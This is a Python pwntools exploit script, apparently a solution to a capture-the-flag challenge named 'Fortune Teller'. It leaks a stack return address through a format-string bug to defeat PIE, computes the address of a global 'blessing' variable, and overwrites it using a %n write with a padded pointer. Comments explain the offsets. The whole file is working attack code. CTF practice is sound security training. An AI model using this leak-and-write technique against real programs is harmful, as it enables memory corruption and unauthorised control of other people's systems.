#!/usr/bin/env python3
"""Fortune Teller — format-string write of blessing = 0x1337."""

from pwn import *

context.arch = "amd64"

HOST = "fortune-teller-8488a32d29ce.inst15.ctf.fortid.com"
PORT = 1337

# ask_oracle returns to the instruction after `call ask_oracle` in main.
RET_OFF = 0x1664
# nm: blessing is an unsigned int in .bss
BLESSING_OFF = 0x404c
# question[] is the first stack vararg of printf (arg 6). The saved return
# address sits 0x118 bytes later, so it is argument 6 + 0x118/8 = 41.
LEAK_ARG = 41


def menu(io, choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def exploit(io):
    menu(io, 1)
    io.recvuntil(b"> ")
    io.sendline(f"%{LEAK_ARG}$p".encode())
    io.recvuntil(b"The oracle speaks:\n")
    leak = int(io.recvline().strip(), 16)
    base = leak - RET_OFF
    blessing = base + BLESSING_OFF
    log.success(f"leak={leak:#x} base={base:#x} blessing={blessing:#x}")

    # %4919c prints 0x1337 bytes, then %8$n stores that count.
    # The pointer is placed at byte 16 of the buffer, which is argument 8.
    # It cannot go first: a PIE address contains NUL bytes and would truncate
    # the format string.
    menu(io, 1)
    io.recvuntil(b"> ")
    fmt = b"%4919c%8$n"
    pad = b"A" * (16 - len(fmt))
    io.sendline(fmt + pad + p64(blessing))
    io.recvuntil(b"1. Ask the oracle")

    menu(io, 2)
    print(io.recvuntil(b"1. Ask the oracle").decode())


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "local":
        io = process("./fortune")
    else:
        io = remote(HOST, PORT, ssl=True)
    exploit(io)
    io.close()
